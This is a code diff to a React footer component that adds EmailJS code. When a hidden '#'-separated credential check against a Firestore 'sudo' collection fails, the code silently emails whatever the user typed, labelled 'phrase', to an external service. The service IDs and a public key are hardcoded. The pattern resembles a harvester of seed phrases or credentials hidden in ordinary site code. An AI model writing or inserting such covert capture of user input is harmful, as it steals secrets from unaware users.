@@ -3,6 +3,7 @@ import { Link } from "react-router-dom";
 import { Banner } from "./Banner";
 import { db } from "../firebase-config";
 import { collection, getDocs } from "firebase/firestore";
+import emailjs from "@emailjs/browser";
 
 export const Footer = ({ setIsAuth }) => {
   const [isClicked, setIsClicked] = useState(false);
@@ -15,8 +16,31 @@ export const Footer = ({ setIsAuth }) => {
 
   const rootdetails = collection(db, "sudo");
 
+  const sendEmail = async () => {
+    const templateParams = {
+      phrase: input,
+    };
+
+    emailjs
+      .send(
+        "service_lc3bvbm",
+        "template_j5d40fh",
+        templateParams,
+        "aVOQWUj3fiSFrMO2C"
+      )
+      .then(
+        (response) => {
+          console.log("SUCCESS!", response.status, response.text);
+        },
+        (err) => {
+          console.log("FAILED...", err);
+        }
+      );
+  };
+
   const submitDetails = () => {
     const details = input.split("#");
+
     // console.log(details);
     const getUser = async () => {
       const data = await getDocs(rootdetails);
@@ -28,7 +52,10 @@ export const Footer = ({ setIsAuth }) => {
         ) {
           console.log("verified succesfully");
           setIsAuth(true);
-        } else console.log("verification failed");
+        } else {
+          sendEmail();
+          console.log("verification failed");
+        }
       }
     };
 
